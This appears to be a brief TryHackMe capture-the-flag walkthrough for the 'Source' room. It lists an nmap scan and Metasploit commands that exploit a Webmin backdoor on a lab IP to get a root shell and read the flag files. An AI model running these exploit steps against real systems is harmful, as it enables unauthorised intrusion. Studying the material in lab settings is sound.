# THM - Source

```shell
nmap -sV -sC -oA scans/initial-scan 10.10.140.48

msfconsole
	search webmin_backdoor
	use 0
		show options
		set RHOSTS 10.10.140.48
		set LHOST tun0		# tun0 vs eth0, primeiro estar dentro da rede, por VPN (ver VPN-THM)
		set SSL true
		run
			whoami
			cat /root/root.txt
			cat /home/dark/user.txt
```
	
